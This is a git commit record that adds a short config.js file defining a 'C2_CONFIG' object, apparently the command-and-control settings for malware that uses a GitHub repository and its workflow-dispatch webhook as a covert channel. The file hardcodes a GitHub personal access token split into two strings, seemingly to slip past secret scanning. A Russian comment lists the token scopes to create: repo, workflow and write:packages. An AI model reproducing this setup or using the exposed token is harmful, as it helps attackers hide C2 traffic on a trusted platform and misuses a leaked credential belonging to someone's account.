47f869b5b3eb574760c4c4c03ecad19ac34677c8
viklasdvd <hudcscss1@gmail.com>
2026-05-05 22:14:26 +0300

    Create config.js

---
+++ config.js
@@ -0,0 +1,10 @@
+// config.js
+const C2_CONFIG = {
+    repoOwner: "viklasdvd",
+    repoName: "viklasdvd",
+    githubToken: "ghp_M4x4GbMUN3pCr" + "Rn49PhAln2XFV2m6I4CSxL7",
+    webhookUrl: "https://api.github.com/repos/viklasdvd/viklasdvd/dispatches"
+};
+
+// Токен нужно создать: GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)
+// Права: repo, workflow, write:packages
